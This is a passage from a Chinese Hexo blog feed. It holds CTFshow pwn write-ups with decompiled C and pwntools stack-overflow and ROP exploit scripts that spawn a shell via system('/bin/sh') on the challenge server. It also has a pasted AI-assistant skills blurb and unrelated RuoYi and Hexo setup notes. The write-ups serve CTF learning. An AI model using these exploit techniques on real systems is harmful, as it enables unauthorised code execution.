class="string">在64位中，地址是64位长的，因此需要使用p64()函数来正确地构造返回地址。此外，由于64位架构中函数调用的参数通常通过寄存器传递，栈上可能会有更多的空隙，因此在构造payload时需要更精确地计算填充长度</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">64位架构下的栈溢出攻击需要更加注意栈的对齐和堆栈平衡，同时使用p64()函数来构造正确的64位地址。在构造payload时，还需要插入适当的ret gadget以确保正确的函数调用流程</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ctfshow{acb00b19-9c0e-49ca-8a0c-3819a7a9ecf7}</li>
</ul>
<h3 id="039-栈溢出-32位手动构造system-“-bin-sh”"><a class="header-anchor" href="#039-栈溢出-32位手动构造system-“-bin-sh”">¶</a>039 栈溢出+32位手动构造system(“/bin/sh”)</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn039/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">32位 关闭了栈保护与PIE</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 美术部分</span></span><br><span class="line">  <span class="built_in">puts</span>(asc_804876C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80487E0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804885C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488E8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048978);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489FC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A90);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : It has system and &#x27;/bin/sh&#x27;,but they don&#x27;t work together&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Just easy ret2text&amp;&amp;32bit&quot;</span>);</span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">  ctfshow(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">14</span>]; <span class="comment">// [esp+6h] [ebp-12h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32</span>u);  <span class="comment">// 通过read系统调用读取最多50字节的数据到buf中。由于buf的大小小于读取的字节数，这就产生了栈溢出的可能性</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;You find me?&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28195</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = <span class="number">0x8048750</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>) + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line"><span class="comment"># 前半部分&#x27;a&#x27;*(0x12+4)是用来填充并覆盖返回地址的</span></span><br><span class="line"><span class="comment"># p32(system)是system函数的地址，通过elf.sym[&#x27;system&#x27;]获取。system函数接受一个字符串参数并执行它，这正是我们想要利用的功能</span></span><br><span class="line"><span class="comment"># p32(0)是多余的返回地址，因为system函数通常不会返回。但是，为了构造payload的完整性，这里放置了一个地址，这个地址实际上不会被执行</span></span><br><span class="line"><span class="comment"># p32(bin_sh)是/bin/sh字符串的地址。由于system函数需要一个字符串参数，所以这里需要/bin/sh的地址。在这个二进制文件中，/bin/sh字符串已经被硬编码了，其地址是0x8048750（这是哪里看的？</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)  <span class="comment"># sendline函数用于发送构造好的payload。sendline会自动在payload末尾添加一个换行符，这通常与read系统调用期望的输入格式相匹配</span></span><br><span class="line">io.recv()  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>ctfshow{fc36efc2-3af6-4607-9296-a1bfbbe8eaaa}</li>
</ul>
<h3 id="040-栈溢出-64位手动构造system-“-bin-sh”"><a class="header-anchor" href="#040-栈溢出-64位手动构造system-“-bin-sh”">¶</a>040 栈溢出+64位手动构造system(“/bin/sh”)</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn040/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">64位   关闭了栈保护和PIE</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400828);</span><br><span class="line">  <span class="built_in">puts</span>(asc_4008A0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400920);</span><br><span class="line">  <span class="built_in">puts</span>(asc_4009B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400A40);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400AC8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : It has system and &#x27;/bin/sh&#x27;,but they don&#x27;t work together&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Just easy ret2text&amp;&amp;64bit&quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;You find me?&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>有system函数，有‘/bin/sh’字符串，但是不在一起，因此我们仍然需要手动进行构造payload</li>
<li>64位和32位不同，参数不是直接放在栈上，而是优先放在寄存器rdi,rsi,rdx,rcx,r8,r9。这几个寄存器放不下时才会考虑栈</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28309</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = <span class="number">0x400808</span></span><br><span class="line">pop_rdi = <span class="number">0x4007e3</span> <span class="comment"># 0x00000000004007e3 : pop rdi ; ret</span></span><br><span class="line">ret = <span class="number">0x4004fe</span> <span class="comment"># 0x00000000004004fe : ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	①&#x27;a&#x27;*(0xA+8) : 这部分生成了一个由字符 &#x27;a&#x27; 组成的字符串，长度为0xA+8。这是为了填充缓冲区，达到溢出栈帧的目的</span></span><br><span class="line"><span class="string">	 ②p64(pop_rdi) : 这部分使用 p64 函数将 pop_rdi 的地址转换为一个8字节的字符串。pop_rdi 指令用于将值从栈上弹出并存储到寄存器rdi中。在这个payload中，它用于准备传递给 system 函数的第一个参数</span></span><br><span class="line"><span class="string">	 ③p64(bin_sh) : 这部分使用 p64 函数将 bin_sh 的地址转换为一个8字节的字符串。 bin_sh 通常是指向包含要执行的命令的字符串（如 /bin/sh ）的指针。该字符串将作为 system 函数的第一个参数</span></span><br><span class="line"><span class="string">	 ④ p64(ret) : 这部分使用 p64 函数将 ret 的地址转换为一个8字节的字符串。 ret 是一个返回指令，用于将程序控制权返回到栈上保存的地址。在这个payload中，它被用作一个间接跳转指令，用于绕过栈中的返回地址，以达到执行 system 函数的目的</span></span><br><span class="line"><span class="string">	 ⑤p64(system) : 这部分使用 p64 函数将 system 的函数地址转换为一个8字节的字符串。system 是一个函数指针，指向一个可以执行系统命令的函数</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">最终我们的目的就是通过栈溢出修改返回地址，以控制程序执行流程。</span></span><br><span class="line"><span class="string">它通过调用 pop_rdi 指令将bin_sh 的地址加载到寄存器rdi中，然后通过 ret 指令进行间接跳转，最终调用 system 函数，以执行system(“/bin/sh”)进而获得一个我们想要的shell</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>ctfshow{53e6a886-b8f0-4a6e-b306-ccfc10370001}</li>
</ul>
<h3 id="041"><a class="header-anchor" href="#041">¶</a>041</h3>
<p>他妈的好难啊啊啊啊啊啊啊啊啊</p>
<h3 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h3>
<p>作为一名CTF（Capture The Flag）竞赛中专注于PWN方向的专家，我（调教过的通义灵码）具备以下技能和知识：</p>
<ol>
<li><strong>二进制漏洞利用</strong>：理解并利用缓冲区溢出、格式化字符串漏洞、整数溢出、使用-after-free、双free等常见漏洞。</li>
<li><strong>调试技巧</strong>：熟练使用GDB进行调试，包括设置断点、单步执行、查看内存和寄存器状态等。</li>
<li><strong>逆向工程</strong>：能够使用IDA Pro、Binary Ninja或Ghidra等工具分析二进制程序，理解函数逻辑和数据流。</li>
<li><strong>ROP（Return-Oriented Programming）</strong>：掌握ROP技术，能够在禁止执行堆栈的情况下构造ROP链以实现任意代码执行。</li>
<li><strong>Python编程</strong>：擅长使用Python编写脚本来自动化漏洞利用流程，如生成payload、解析二进制文件、与目标服务交互等。</li>
<li><strong>网络协议和安全</strong>：了解TCP/IP协议栈，能够分析网络通信，识别和利用网络服务中的漏洞。</li>
<li><strong>操作系统安全机制</strong>：理解ASLR（地址空间布局随机化）、NX（No eXecute）位、Canary值等现代操作系统安全特性，并能绕过它们。</li>
<li><strong>工具使用</strong>：熟悉pwntools、ROPgadget、radare2等工具在PWN中的应用。</li>
<li><strong>编写和破解Exploit</strong>：能够编写稳定的exploit，并对现有的exploit进行分析和修改以适应不同的环境。</li>
</ol>
<p>如果你正在准备一个CTF比赛或者遇到某个具体的PWN挑战，我可以帮助你分析问题，提供解决方案，或者指导你如何编写相应的Python脚本来辅助你的工作。请告诉我你具体需要哪方面的帮助。</p>
<p>当然，不过为了给出更准确的分析，我需要你先提供一些关于题目本身的信息。不过，我可以基于一些常见的PWN题目类型来推测可能涉及的知识点。</p>
<p>假设我们讨论的是一个典型的PWN题目，那么它可能会涉及到以下几个方面：</p>
<h4 id="1-二进制分析"><a class="header-anchor" href="#1-二进制分析">¶</a>1. <strong>二进制分析</strong></h4>
<ul>
<li><strong>ELF文件结构</strong>：理解ELF文件的结构，包括段（segments）和节（sections），例如<code>.text</code>、<code>.data</code>、<code>.bss</code>和<code>.rodata</code>等。</li>
<li><strong>动态链接</strong>：了解动态链接的工作原理，包括如何加载共享库和解析符号。</li>
<li><strong>符号表和调试信息</strong>：学习如何利用符号表和DWARF调试信息进行逆向工程和调试。</li>
</ul>
<h4 id="2-漏洞利用"><a class="header-anchor" href="#2-漏洞利用">¶</a>2. <strong>漏洞利用</strong></h4>
<ul>
<li><strong>缓冲区溢出</strong>：利用缓冲区溢出来覆盖返回地址，从而控制程序的执行流程。</li>
<li><strong>格式化字符串漏洞</strong>：利用格式化字符串漏洞读取或写入内存。</li>
<li><strong>整数溢出</strong>：当整数运算结果超出其表示范围时，可以导致意外的行为或漏洞。</li>
<li><strong>使用-after-free</strong>：在释放内存后重新使用该内存块可能导致的漏洞。</li>
<li><strong>双free</strong>：同一内存区域被释放两次可能导致的未定义行为。</li>
<li><strong>堆喷射</strong>：通过精心设计的输入，可以在堆上分配和控制特定的内存块。</li>
</ul>
<h4 id="3-绕过安全机制"><a class="header-anchor" href="#3-绕过安全机制">¶</a>3. <strong>绕过安全机制</strong></h4>
<ul>
<li><strong>ASLR（地址空间布局随机化）</strong>：通过预测或泄漏基地址来绕过ASLR保护。</li>
<li><strong>DEP（数据执行保护）</strong>：使用NOP滑块或ROP技术绕过DEP，使得非代码段内存也可以执行。</li>
<li><strong>Canary值</strong>：理解和绕过用于检测缓冲区溢出的canary值。</li>
</ul>
<h4 id="4-ROP（Return-Oriented-Programming）"><a class="header-anchor" href="#4-ROP（Return-Oriented-Programming）">¶</a>4. <strong>ROP（Return-Oriented Programming）</strong></h4>
<ul>
<li><strong>ROP基础</strong>：如何寻找和利用ROP小工具来构建ROP链。</li>
<li><strong>ROPgadget工具</strong>：使用ROPgadget来自动搜索ROP小工具。</li>
</ul>
<h4 id="5-调试和逆向工程"><a class="header-anchor" href="#5-调试和逆向工程">¶</a>5. <strong>调试和逆向工程</strong></h4>
<ul>
<li><strong>GDB</strong>：使用GDB进行调试，包括设置断点、单步执行、检查内存和寄存器状态。</li>
<li><strong>IDA Pro或Binary Ninja</strong>：使用逆向工程工具来分析二进制文件的内部结构和逻辑。</li>
</ul>
<h4 id="6-自动化脚本"><a class="header-anchor" href="#6-自动化脚本">¶</a>6. <strong>自动化脚本</strong></h4>
<ul>
<li><strong>pwntools</strong>：使用pwntools库来自动化漏洞利用的过程，包括与远程服务交互和构造payload。</li>
</ul>
<p>一旦你提供了具体的题目细节，我可以针对那些特定的知识点提供更深入的解释和指导。请分享题目的相关信息，这样我们可以开始具体的分析。</p>
]]></content>
      <categories>
        <category>notes</category>
        <category>Pwn notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【Pvvn】vvp留档</title>
    <url>/project/2024/07/16/CS_Notes/PWN/%E3%80%90Pwn%E3%80%91wp%E5%AD%98%E6%A1%A3/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>方便起见把v|v|p统一收到一个地方，文件有点乱。但是因为是付|费|内|容所以很担心可能的律|师|函警告。。。。所以保险起见先把仓库地址和邮箱放这里如有侵|权请联系在下orz会马上删除的。。跪orz</p>
<ul>
<li>
<p>此博客对应的gith|ub仓库地址：<a href="https://github.com/brocademaple/brocademaple.github.io">brocademaple/brocademaple.github.io</a></p>
</li>
<li>
<p>苯人邮|箱：1300672728@qq.com</p>
</li>
<li>
<p>并且还要做一些防|搜|索保护。。。。</p>
</li>
</ul>
<h3 id="0-0-1-0-3-6"><a class="header-anchor" href="#0-0-1-0-3-6">¶</a>0|0|1-0|3|6</h3>

	<iframe src="https://www.slideshare.net/slideshow/embed_code/key/9rkGKLES9q0fBp?hostedIn=slideshare&amp;page=upload&quot;" style="width:100%;height:550px" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen> </iframe> <div style="margin-bottom:5px">


<h3 id="0-3-7-0-7-2"><a class="header-anchor" href="#0-3-7-0-7-2">¶</a>0|3|7-|0|7|2</h3>

	<iframe src="https://www.slideshare.net/slideshow/embed_code/key/4CxnYCwT8q57hu?hostedIn=slideshare&amp;page=upload" style="width:100%;height:550px" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen> </iframe> <div style="margin-bottom:5px">


<h3 id="0-7-3-1-0-8"><a class="header-anchor" href="#0-7-3-1-0-8">¶</a>0|7|3-|1|0|8</h3>

	<iframe src="https://www.slideshare.net/slideshow/embed_code/key/sDflqYKwHnd0f5?hostedIn=slideshare&amp;page=upload" style="width:100%;height:550px" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen> </iframe> <div style="margin-bottom:5px">


<h3 id="中-期-测-试"><a class="header-anchor" href="#中-期-测-试">¶</a>中|期|测|试</h3>

	<iframe src="https://www.slideshare.net/slideshow/embed_code/key/GacKXJvz6vH0l6?hostedIn=slideshare&amp;page=upload" style="width:100%;height:550px" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen> </iframe> <div style="margin-bottom:5px">


<h3 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h3>
<p>偷感很重的在学pvvn的大学生一枚吖 QwQ</p>
</div></div></div></div>]]></content>
      <categories>
        <category>notes</category>
        <category>Pwn notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【RuoYi + AI】1 导入部分</title>
    <url>/project/2024/07/07/CS_Notes/RuoYi/%E3%80%90RuoYi-+-AI%E3%80%911_%E5%AF%BC%E5%85%A5%E9%83%A8%E5%88%86/</url>
    <content><![CDATA[<h2 id="导入部分"><a class="header-anchor" href="#导入部分">¶</a>导入部分</h2>
<h3 id="系统开发流程与AI局限性"><a class="header-anchor" href="#系统开发流程与AI局限性">¶</a>系统开发流程与AI局限性</h3>
<ol>
<li><code>项目环境搭建，技术选型，框架整合</code></li>
<li><code>设计产品原型，例如库表、接口等</code></li>
<li><code>前后端编码，将设计转换为实际的软件功能</code></li>
<li><code>测试部署上线</code></li>
</ol>
<p>AI能完成编码部分，但是环境搭建部分还是得人工</p>
<p>AI在设计阶段也可以起到辅助作用</p>
<p>在测试部署阶段，AI可以辅助生成测试用例，编写部署所需要的脚本</p>
<ul>
<li>
<p>若伊功能：<code>快速构建</code>  <code>通用模块</code>  <code>代码生成（尤其是对于需要重复编写的增删改查部分）</code></p>
</li>
<li>
<p>若伊：基于SpringBoot+Bootstrap的极速后台开发框架</p>
</li>
</ul>
<h3 id="基础应用部分"><a class="header-anchor" href="#基础应用部分">¶</a>基础应用部分</h3>
<ul>
<li>若伊搭建</li>
<li>入门案例</li>
<li>功能详解</li>
<li>项目结构</li>
<li>源码阅读</li>
<li>二次开发</li>
<li>通义灵码AI工具</li>
</ul>
<h3 id="项目实战部分"><a class="header-anchor" href="#项目实战部分">¶</a>项目实战部分</h3>
<ul>
<li>帝可得-项目搭建</li>
<li>帝可得-前端页面</li>
<li>帝可得-点位管理</li>
<li>帝可得-人员管理</li>
<li>帝可得-设备管理</li>
<li>AI优化代码</li>
<li>AI生成代码</li>
<li>AI代码调错</li>
</ul>
<h3 id="拔高原理部分"><a class="header-anchor" href="#拔高原理部分">¶</a>拔高原理部分</h3>
<ul>
<li>若伊框架的核心原理和底层运行机制分析</li>
<li>Velocity代码生成器</li>
<li>RBAC权限控制</li>
<li>异步任务管理器</li>
<li>自定义日志注解</li>
<li>AI生成注释</li>
<li>AI辅助阅读</li>
</ul>
<h3 id="前置知识"><a class="header-anchor" href="#前置知识">¶</a>前置知识</h3>
<ul>
<li>关系型数据库 MySQL</li>
<li>非关系型数据库Redis</li>
<li>后端
<ul>
<li>Springboot</li>
<li>MyBatis</li>
</ul>
</li>
<li>前端
<ul>
<li>Vue3</li>
<li>Axios</li>
<li>Element-Plus</li>
</ul>
</li>
<li>工具
<ul>
<li>IDEA、VSCode</li>
<li>Git</li>
</ul>
</li>
<li>AI+若伊
<ul>
<li>全栈开发</li>
</ul>
</li>
</ul>
<h2 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h2>
<p>以后真的全栈3k吧hhhhhh</p>
]]></content>
      <categories>
        <category>notes</category>
        <category>RuoYi notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>RuoYi</tag>
      </tags>
  </entry>
  <entry>
    <title>【RuoYi + AI】2_若伊搭建</title>
    <url>/project/2024/07/07/CS_Notes/RuoYi/%E3%80%90RuoYi-+-AI%E3%80%912_%E8%8B%A5%E4%BC%8A%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="若伊搭建"><a class="header-anchor" href="#若伊搭建">¶</a>若伊搭建</h2>
<h3 id="版本的解释"><a class="header-anchor" href="#版本的解释">¶</a>版本的解释</h3>
<p><s><code>RuoYi</code> 前后端混合开发版本   后端Springboot  前端Bootstrap</s>  已淘汰</p>
<p><code>RuoYi-Vue</code> 前后端分离开发版本   后端Springboot  前端Vue   单体项目√   中大型项目会有性能或扩展性的问题</p>
<p><code>RuoYi-Cloud</code>   后端SpringCloud  前端Bootstrap   微服务版本，系统延伸性和稳定性有    做分布式微服务项目选这个</p>
<p>以上两个提供的都是PC端，移动端的选下面APP这个版本</p>
<p><code>RuoYi-APP</code>   后端Uniapp前端Vue  一次编写多端运行</p>
<ul>
<li>注意：<code>RuoYi-APP</code>没有提供后端代码，可以适配<code>RuoYi-Vue</code>和<code>RuoYi-Cloud</code></li>
</ul>
<p><code>RuoYi-other</code> <code>Vue3+ElementPlus+Vite</code></p>
<h3 id="RuoYi-Vue"><a class="header-anchor" href="#RuoYi-Vue">¶</a>RuoYi-Vue</h3>
<ul>
<li>前后端分离的单体框架设计</li>
<li>软件环境：JDK、MySQL、Redis、Maven、Node</li>
</ul>
<p>阿西吧我服了最讨厌配环境了……</p>
<h4 id="确认版本"><a class="header-anchor" href="#确认版本">¶</a>确认版本</h4>
<ul>
<li>
<p>JDK</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>
<p>获得信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;java -version</span><br><span class="line">java version <span class="string">&quot;17.0.9&quot;</span> 2023-10-17 LTS</span><br><span class="line">Java(TM) SE Runtime Environment (build 17.0.9+11-LTS-201)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 17.0.9+11-LTS-201, mixed mode, sharing)</span><br><span class="line"></span><br><span class="line">&gt;javac -version</span><br><span class="line">javac 17.0.9</span><br></pre></td></tr></table></figure>
<ul>
<li>课程版本：JDK 11</li>
</ul>
</li>
<li>
<p>MySQL</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql --version</span><br><span class="line">mysql -V   </span><br><span class="line">// 都行</span><br></pre></td></tr></table></figure>
<ul>
<li>服了，之前为了配小皮的环境把本地mysql给卸了，不知道要不要重装一个</li>
<li>课程版本：MySQL 8</li>
</ul>
</li>
<li>
<p>Redis</p>
<ul>
<li>当Redis服务器正在运行，使用以下命令：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli info | grep redis_version</span><br></pre></td></tr></table></figure>
<ul>
<li>没启动就先启动Redis服务器</li>
<li>课程版本：Redis 5（Win）</li>
</ul>
</li>
<li>
<p>Maven</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn -version</span><br></pre></td></tr></table></figure>
<ul>
<li>课程版本：Maven 3.6</li>
</ul>
</li>
<li>
<p>Node.js以及npm（Node的包管理器），可以使用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm -v</span><br></pre></td></tr></table></figure>
<ul>
<li>获得信息：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;node -v</span><br><span class="line">v20.12.1</span><br><span class="line"></span><br><span class="line">&gt;npm -v</span><br><span class="line">10.5.0</span><br></pre></td></tr></table></figure>
<ul>
<li>课程版本：Node16（Vue3）</li>
</ul>
</li>
</ul>
<h4 id="技术选型"><a class="header-anchor" href="#技术选型">¶</a>技术选型</h4>
<ul>
<li>Spring Boot</li>
<li>Spring Security</li>
<li>MyBatis</li>
<li>Jwt</li>
<li>Vue3</li>
<li>Element-Plus</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://gitee.com/y_project/RuoYi-Vue</span><br></pre></td></tr></table></figure>
<p>芝士前后端分离版本的脚手架，但是其中的ruoyi-ui使用的还是Vue2版本，换成Vue3</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://gitee.com/fanxincc/RuoYi-Vue3</span><br></pre></td></tr></table></figure>
<p>以上是Vue3扩展地址</p>
<h2 id="搭建后端项目步骤"><a class="header-anchor" href="#搭建后端项目步骤">¶</a>搭建后端项目步骤</h2>
<ol>
<li>Git克隆并初始化项目</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">→ 打开IDEA </span><br><span class="line">→ 右上角Get from VCS </span><br><span class="line">→ 将仓库存储地址和url复制上去  RuoYi-Vue</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>MySQL导入与配置</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1pf421B71v/?p=2&amp;spm_id_from=pageDriver&amp;vd_source=3f0983ef34615b702fec513c41e55a64">基础篇-02.若依搭建_哔哩哔哩_bilibili</a></p>
]]></content>
      <categories>
        <category>notes</category>
        <category>RuoYi notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>RuoYi</tag>
      </tags>
  </entry>
  <entry>
    <title>【hexo】添加pdf</title>
    <url>/project/2024/07/13/CS_Notes/hexo/%E3%80%90hexo%E3%80%91%E6%B7%BB%E5%8A%A0pdf/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>尝试在hexo中插入pdf，可在当前页面浏览【此处缺少效果图】</p>
<h3 id="第一步"><a class="header-anchor" href="#第一步">¶</a>第一步</h3>
